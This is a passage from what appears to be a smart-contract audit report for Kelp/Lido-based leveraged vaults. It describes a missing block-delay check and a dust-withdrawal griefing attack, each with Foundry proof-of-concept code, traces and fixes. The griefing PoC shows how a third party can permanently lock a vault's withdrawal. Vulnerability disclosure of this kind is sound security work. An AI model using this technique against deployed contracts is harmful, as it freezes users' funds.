Changing it to medium severity in light of the sponsor's detailed reasonings.

# Issue M-7: The integration with `Kelp:WithdrawManager` is not correct 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/87 

## Found by 
aman
## Summary
`KelpLib:_canTriggerExtraStep` returns true if the withdrawal request at Kelp is permitted to proceed, but it does not account for the block delay imposed by Kelp for each withdrawal request.also in `KelpCooldownHolder:triggerExtraStep` we only check for nonce and calls the ` WithdrawManager.completeWithdrawal(stETH);`


## Vulnerability Detail
For a `RSETH:ETH` withdrawal, the request will first be processed by the Kelp protocol, converting `RSETH` into `STETH`. Once `STETH` is received from Kelp, we  trigger an `STETH:ETH` withdrawal request at LIDO. The issue lies in `_canTriggerExtraStep` , which is solely responsible for returning true if the request at Kelp can be completed.And also in `triggerExtraStep` which will revert.

```solidity
   function _canTriggerExtraStep(uint256 requestId) internal view returns (bool) {
        address holder = address(uint160(requestId));
        if (KelpCooldownHolder(payable(holder)).triggered()) return false;

        (/* */, /* */, /* */, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);

        return userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH);
    }
```
From the above code We can observed that it only check for the request Nonce if Nonce is less than `nextLockedNonce` then we return true. if we check a `LRTWithdrawalManager:completeWithdrawal` function.
```solidity
    function completeWithdrawal(address asset) external nonReentrant whenNotPaused onlySupportedAsset(asset) {
        // Retrieve and remove the oldest withdrawal request for the user.
        uint256 usersFirstWithdrawalRequestNonce = userAssociatedNonces[asset][msg.sender].popFront();
        // Ensure the request is already unlocked.
        if (usersFirstWithdrawalRequestNonce >= nextLockedNonce[asset]) revert WithdrawalLocked();

        bytes32 requestId = getRequestId(asset, usersFirstWithdrawalRequestNonce);
        WithdrawalRequest memory request = withdrawalRequests[requestId];

        delete withdrawalRequests[requestId];

        // Check that the withdrawal delay has passed since the request's initiation.
@>---      if (block.number < request.withdrawalStartBlock + withdrawalDelayBlocks) revert WithdrawalDelayNotPassed();

        if (asset == LRTConstants.ETH_TOKEN) {
            (bool sent,) = payable(msg.sender).call{ value: request.expectedAssetAmount }("");
            if (!sent) revert EthTransferFailed();
        } else {
            IERC20(asset).safeTransfer(msg.sender, request.expectedAssetAmount);
        }

        emit AssetWithdrawalFinalized(msg.sender, asset, request.rsETHUnstaked, request.expectedAssetAmount);
    }

```
it also check for block delay which is missing from our implementation.
<details>
  <summary>Coded POC</summary>

Add following variable to PATH:
```javascript
//.env in terminal
export FORK_BLOCK=19691163
export FOUNDRY_PROFILE=mainnet
export RPC_URL=MAINNET_URL
```
Add Following file as `Kelp.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./Staking/harness/index.sol";
import {PendleDepositParams, IPRouter, IPMarket} from "@contracts/vaults/staking/protocols/PendlePrincipalToken.sol";
import {PendlePTOracle} from "@contracts/oracles/PendlePTOracle.sol";
import "@interfaces/chainlink/AggregatorV2V3Interface.sol";
import {WithdrawManager, stETH, LidoWithdraw, rsETH, KelpCooldownHolder, IWithdrawalManager} from "@contracts/vaults/staking/protocols/Kelp.sol";
import {PendlePTKelpVault} from "@contracts/vaults/staking/PendlePTKelpVault.sol";
import "forge-std/console.sol";
import {VaultRewarderTests} from "./SingleSidedLP/VaultRewarderTests.sol";

interface ILRTOracle {
    // methods
    function getAssetPrice(address asset) external view returns (uint256);
    function assetPriceOracle(address asset) external view returns (address);
    function rsETHPrice() external view returns (uint256);
}

ILRTOracle constant lrtOracle = ILRTOracle(
    0x349A73444b1a310BAe67ef67973022020d70020d
);
address constant unstakingVault = 0xc66830E2667bc740c0BED9A71F18B14B8c8184bA;

contract Test_PendlePT_rsETH_ETH is BasePendleTest {
    function setUp() public override {
        FORK_BLOCK = 20033103;

        harness = new Harness_PendlePT_rsETH_ETH();

        // NOTE: need to enforce some minimum deposit here b/c of rounding issues
        // on the DEX side, even though we short circuit 0 deposits
        minDeposit = 0.1e18;
        maxDeposit = 10e18;
        maxRelEntryValuation = 50 * BASIS_POINT;
        maxRelExitValuation = 50 * BASIS_POINT;
        maxRelExitValuation_WithdrawRequest_Fixed = 0.03e18;
        maxRelExitValuation_WithdrawRequest_Variable = 0.005e18;
        deleverageCollateralDecreaseRatio = 930;
        defaultLiquidationDiscount = 955;
        withdrawLiquidationDiscount = 945;

        super.setUp();
    }

    function _finalizeFirstStep() private {
        // finalize withdraw request on Kelp
        address stETHWhale = 0x804a7934bD8Cd166D35D8Fb5A1eb1035C8ee05ce;
        vm.prank(stETHWhale);
        IERC20(stETH).transfer(unstakingVault, 10_000e18);
        vm.startPrank(0xCbcdd778AA25476F203814214dD3E9b9c46829A1); // kelp: operator
        WithdrawManager.unlockQueue(
            address(stETH),
            type(uint256).max,
            lrtOracle.getAssetPrice(address(stETH)),
            lrtOracle.rsETHPrice()
        );
        vm.stopPrank();
    }

    function _finalizeSecondStep() private {
        // finalize withdraw request on LIDO
        address lidoAdmin = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        deal(lidoAdmin, 1000e18);
        vm.startPrank(lidoAdmin);
        LidoWithdraw.finalize{value: 1000e18}(
            LidoWithdraw.getLastRequestId(),
            1.1687147788880494e27
        );
        vm.stopPrank();
    }

    function finalizeWithdrawRequest(address account) internal override {
        _finalizeFirstStep();

        // trigger withdraw from Kelp nad unstake from LIDO
        WithdrawRequest memory w = v().getWithdrawRequest(account);
        PendlePTKelpVault(payable(address(vault))).triggerExtraStep(
            w.requestId
        );

        _finalizeSecondStep();
    }

    function getDepositParams(
        uint256 /* depositAmount */,
        uint256 /* maturity */
    ) internal pure override returns (bytes memory) {
        PendleDepositParams memory d = PendleDepositParams({
            // No initial trading required for this vault
            dexId: 0,
            minPurchaseAmount: 0,
            exchangeData: "",
            minPtOut: 0,
            approxParams: IPRouter.ApproxParams({
                guessMin: 0,
                guessMax: type(uint256).max,
                guessOffchain: 0,
                maxIteration: 256,
                eps: 1e15 // recommended setting (0.1%)
            })
        });

        return abi.encode(d);
    }


      function test_Revert_When_Delay_Not_Passed_at_triggerExtraStep(
        uint8 maturityIndex,
        uint256 depositAmount,
        bool useForce
    ) public {
        depositAmount = uint256(bound(depositAmount, minDeposit, maxDeposit));
        maturityIndex = uint8(bound(maturityIndex, 0, 2));
        address account = makeAddr("account");
        uint256 maturity = maturities[maturityIndex];

        uint256 vaultShares = enterVault(
            account,
            depositAmount,
            maturity,
            getDepositParams(depositAmount, maturity)
        );

        setMaxOracleFreshness();
        vm.warp(expires + 3600);
        try
            Deployments.NOTIONAL.initializeMarkets(
                harness.getTestVaultConfig().borrowCurrencyId,
                false
            )
        {} catch {}
        if (maturity < block.timestamp) {
            // Push the vault shares to prime
            totalVaultShares[maturity] -= vaultShares;
            maturity = maturities[0];
            totalVaultShares[maturity] += vaultShares;
        }

        if (useForce) {
            _forceWithdraw(account);
        } else {
            vm.prank(account);
            v().initiateWithdraw();
        }

        WithdrawRequest memory w = v().getWithdrawRequest(account);

        assertFalse(
            PendlePTKelpVault(payable(address(vault))).canTriggerExtraStep(
                w.requestId
            )
        );
        assertFalse(
            PendlePTKelpVault(payable(address(vault)))
                .canFinalizeWithdrawRequest(w.requestId)
        );

        _finalizeFirstStep();

        assertTrue(
            PendlePTKelpVault(payable(address(vault))).canTriggerExtraStep(
                w.requestId
            )
        );
        assertFalse(
            PendlePTKelpVault(payable(address(vault)))
                .canFinalizeWithdrawRequest(w.requestId)
        );
        bytes4 selector = bytes4(keccak256("WithdrawalDelayNotPassed()"));

vm.expectRevert(selector);
        PendlePTKelpVault(payable(address(vault))).triggerExtraStep(
            w.requestId
        );
    }
}

contract Harness_PendlePT_rsETH_ETH is PendleStakingHarness {
    function getVaultName() public pure override returns (string memory) {
        return "Pendle:PT rsETH 27JUN2024:[ETH]";
    }

    function getRequiredOracles()
        public
        view
        override
        returns (address[] memory token, address[] memory oracle)
    {
        token = new address[](2);
        oracle = new address[](2);

        // Custom PT Oracle
        token[0] = ptAddress;
        oracle[0] = ptOracle;

        // ETH
        token[1] = 0x0000000000000000000000000000000000000000;
        oracle[1] = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    }

    function getTradingPermissions()
        public
        pure
        override
        returns (
            address[] memory token,
            ITradingModule.TokenPermissions[] memory permissions
        )
    {
        token = new address[](1);
        permissions = new ITradingModule.TokenPermissions[](1);
        // rsETH
        token[0] = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
        permissions[0] = ITradingModule.TokenPermissions({
            // UniswapV3, EXACT_IN_SINGLE, EXACT_IN_BATCH
            allowSell: true,
            dexFlags: 4,
            tradeTypeFlags: 5
        });
    }

    function deployImplementation() internal override returns (address impl) {
        return address(new PendlePTKelpVault(marketAddress, ptAddress));
    }

    function withdrawToken(
        address /* vault */
    ) public pure override returns (address) {
        return stETH;
    }

    constructor() {
        marketAddress = 0x4f43c77872Db6BA177c270986CD30c3381AF37Ee;
        ptAddress = 0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E;
        twapDuration = 15 minutes; // recommended 15 - 30 min
        useSyOracleRate = true;
        baseToUSDOracle = 0x150aab1C3D63a1eD0560B95F23d7905CE6544cCB;

        UniV3Adapter.UniV3SingleData memory u;
        u.fee = 500; // 0.05 %
        bytes memory exchangeData = abi.encode(u);
        uint8 primaryDexId = uint8(DexId.UNISWAP_V3);

        setMetadata(StakingMetadata(1, primaryDexId, exchangeData, false));
    }
}
```
run with command : `forge test --mt test_Revert_When_Delay_Not_Passed_at_triggerExtraStep  -vvvvv`
output : 
```solidity
 ├─ [16807] vault::triggerExtraStep(599997995040149956827517125712971369603738040311 [5.999e47])
    │   ├─ [16353] PendlePTKelpVault::triggerExtraStep(599997995040149956827517125712971369603738040311 [5.999e47]) [delegatecall]
    │   │   ├─ [15647] 0x6918D7322f9cE6e67E98546F769ef309efaAF7F7::triggerExtraStep()
    │   │   │   ├─ [15482] KelpCooldownHolder::triggerExtraStep() [delegatecall]
    │   │   │   │   ├─ [2576] 0x62De59c08eB5dAE4b7E6F7a8cAd3006d6965ec16::getUserWithdrawalRequest(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0x6918D7322f9cE6e67E98546F769ef309efaAF7F7, 0) [staticcall]
    │   │   │   │   │   ├─ [1963] 0x79a0A901dBa2EE392709737D7542a1BC49Ca9AB2::getUserWithdrawalRequest(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0x6918D7322f9cE6e67E98546F769ef309efaAF7F7, 0) [delegatecall]
    │   │   │   │   │   │   └─ ← 20346117805214044161 [2.034e19], 20629446294567039270 [2.062e19], 20033103 [2.003e7], 825
    │   │   │   │   │   └─ ← 20346117805214044161 [2.034e19], 20629446294567039270 [2.062e19], 20033103 [2.003e7], 825
    │   │   │   │   ├─ [1229] 0x62De59c08eB5dAE4b7E6F7a8cAd3006d6965ec16::nextLockedNonce(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84) [staticcall]
    │   │   │   │   │   ├─ [634] 0x79a0A901dBa2EE392709737D7542a1BC49Ca9AB2::nextLockedNonce(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84) [delegatecall]
    │   │   │   │   │   │   └─ ← 826
    │   │   │   │   │   └─ ← 826
    │   │   │   │   ├─ [10243] 0x62De59c08eB5dAE4b7E6F7a8cAd3006d6965ec16::completeWithdrawal(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84)
    │   │   │   │   │   ├─ [9647] 0x79a0A901dBa2EE392709737D7542a1BC49Ca9AB2::completeWithdrawal(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84) [delegatecall]
    │   │   │   │   │   │   ├─ [1187] 0x947Cb49334e6571ccBFEF1f1f1178d8469D65ec7::isSupportedAsset(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84) [staticcall]
    │   │   │   │   │   │   │   ├─ [592] 0xc5cD38d47D0c2BD7Fe18c64a50c512063DC29700::isSupportedAsset(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← WithdrawalDelayNotPassed()
    │   │   │   │   │   └─ ← WithdrawalDelayNotPassed()
    │   │   │   │   └─ ← WithdrawalDelayNotPassed()
    │   │   │   └─ ← WithdrawalDelayNotPassed()
    │   │   └─ ← WithdrawalDelayNotPassed()
    │   └─ ← WithdrawalDelayNotPassed()

```
</details>


## Impact
The `kelpLib._canTriggerExtraStep` returns true when the withdrawal request cannot be completed at Kelp due to `withdrawalDelayBlocks` and also inside `triggerExtraStep` which will revert on `WithdrawalDelayNotPassed`. It means that `_canTriggerExtraStep` is not implemented as required by `Kelp:withdrawManager`.

## Code Snippet
[https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L174](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L174)
[https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L75](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L75)
## Tool used

Manual Review , Foundry

## Recommendation
Add following changes :
```diff
diff --git a/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol b/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol
index 74a689c..400413e 100644
--- a/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol
+++ b/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol
@@ -71,8 +72,8 @@ contract KelpCooldownHolder is ClonedCoolDownHolder {
     /// since we are not able to withdraw ETH directly from Kelp
     function triggerExtraStep() external {
         require(!triggered);
-        (/* */, /* */, /* */, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, address(this), 0);
-        require(userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH));
+        (/* */, /* */, uint256 withdrawalStartBlock, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, address(this), 0); 
+        require(userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH) && block.number>=withdrawalStartBlock + WithdrawManager.withdrawalDelayBlocks());
 
         WithdrawManager.completeWithdrawal(stETH);
         uint256 tokensClaimed = IERC20(stETH).balanceOf(address(this));
@@ -169,9 +170,9 @@ library KelpLib {
         address holder = address(uint160(requestId));
         if (KelpCooldownHolder(payable(holder)).triggered()) return false;
 
-        (/* */, /* */, /* */, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);
+        (/* */, /* */, uint256 withdrawalStartBlock, uint256 userWithdrawalRequestNonce) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);
+        return userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH) && block.number>=withdrawalStartBlock + WithdrawManager.withdrawalDelayBlocks();
 
-        return userWithdrawalRequestNonce < WithdrawManager.nextLockedNonce(stETH);
     }
```

# Issue M-8: `Kelp:_finalizeCooldown` cannot claim the withdrawal if adversary would requestWithdrawals with dust amount for the holder 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/105 

## Found by 
BiasedMerc, lemonmon, xiaoming90, zhuying
## Summary

If an adversary calls `LidoWithdraw.requestWithdrawals` with some dust stETH amount and the `KelpCooldownHolder`'s address, the withdrawal will be locked. It cannot be rescued via `rescueTokens`, since it does not have to logic to `claimWithdrawal`, therefore the withdrawal will be locked permanently.

## Vulnerability Detail

The `KelpCooldownHolder` is responsible to withdraw from rsETH to stETH via `WithdraManager`, and then withdraw stETH to ETH via `LidoWithdraw`. Since it is two step process, the `KelpCooldownHolder` implements `triggerExtraStep`. After the first withdrawal request is finalized, the `triggerExtraStep` should be called to initiate the second withdrawal request.
https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83

The `KelpCooldownHolder._finalizeCooldown` will be called when the `exitVault` is called to finalize the process by `LidoWithdraw.claimWithdrawal` and send the claimed ETH back to the vault.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100

This `KelpCooldownHolder._finalizeCooldown` is, however, hardcoded to claim the 0-th request from the `LidoWithdraw.getWithdrawalRequests`, thus  if there are more than 1 withdrawal requests for this `KelpCooldownHolder`, all the requests but the 0-th request will be ignored.

An adversary can abuse this fact by request withdrawal for the `KelpCooldownHolder` before the `triggerExtraStep` is called. In that case the real withdrawal request will not be the 0-th, and will be ignored. 

After the finalize on the dust withdrawal is done, the accountWithdrawRequest on the PendlePTKelpVault will be deleted and this `finalizeCooldown` on the holder cannot be called again since it has onlyVault modifier. The `rescueTokens` will not help, as the stETH is already transferred to LidoWithdraw.


### PoC

Here is a proof of concept demonstrating that a third party can call `LidoWithdrawals.requestWithdrawals`. And the requestId is in the order of request:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

import {IERC20} from "@interfaces/IERC20.sol";

interface ILidoWithdraw {
    struct WithdrawalRequestStatus {
        uint256 amountOfStETH;
        uint256 amountOfShares;
        address owner;
        uint256 timestamp;
        bool isFinalized;
        bool isClaimed;
    }

    function requestWithdrawals(uint256[] memory _amounts, address _owner) external returns (uint256[] memory requestIds);
    function getWithdrawalRequests(address _owner) external view returns (uint256[] memory requestsIds);
    function getWithdrawalStatus(uint256[] memory _requestIds) external view returns (WithdrawalRequestStatus[] memory statuses);
}

IERC20 constant rsETH = IERC20(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7);
address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
ILidoWithdraw constant LidoWithdraw = ILidoWithdraw(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);


contract KelpTestLido is Test {
    address stETHWhale;
    uint tokensClaimed;

    function setUp() public {
        stETHWhale = 0x804a7934bD8Cd166D35D8Fb5A1eb1035C8ee05ce;
        tokensClaimed = 10e18;
        vm.startPrank(stETHWhale);
        IERC20(stETH).transfer(address(this), tokensClaimed);
        vm.stopPrank();
    }

    function test_Lido_requestId() public {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100;
        // Adversary calls requestWithdrawals for the holder with dust amount
        vm.startPrank(stETHWhale);
        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
        LidoWithdraw.requestWithdrawals(amounts, address(this));
        vm.stopPrank();

        // The real withdrawal request is done after
        amounts[0] = tokensClaimed;
        IERC20(stETH).approve(address(LidoWithdraw), amounts[0]);
        uint256[] memory requestIds = LidoWithdraw.requestWithdrawals(amounts, address(this));
        uint real_requestId = requestIds[0];
        for(uint i=0; i< requestIds.length; i++) {
          emit log_named_uint("request id for real withdrawal request", requestIds[i]);
        }

        requestIds = LidoWithdraw.getWithdrawalRequests(address(this));
        for(uint i=0; i< requestIds.length; i++) {
          console.log("id for %s: %s",i, requestIds[i]);
        }

        ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);
        for(uint i=0; i< requestIds.length; i++) {
          console.log("stETH amount for %s: %s",i, withdrawsStatus[i].amountOfStETH);
        }

        require(real_requestId != requestIds[0]);
    }
}
```

The Result is below: note that the 0-th request only has the dust amount of stETH request (100)

```sh
[PASS] test_Lido_requestId() (gas: 370501)
Logs:
  request id for real withdrawal request: 44537
  id for 0: 44536
  id for 1: 44537
  stETH amount for 0: 100
  stETH amount for 1: 10000000000000000000
```

The addresses are taken from the mainnet, so should fork from the mainnet to test.

## Impact

A malicious actor can use dust amount of stETH to freeze withdrawal from the `KelpPTKelpVault`. The frozen withdrawal will be locked permanently,

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L100

## Tool used

Manual Review

## Recommendation

Consider claiming all the withdrawals from LidoWithdraw. However, an adversary can request withdrawals for the holder multiple times with dust stETH, attempting another DoS factor. Alternatively consider storing the requestId in the triggerExtraStep, and claim only the stored request in the finalize step.




## Discussion

**mystery0x**

The severity of this finding being medium is due to the fact it requires an externally malicious factor to incur the exploit. 

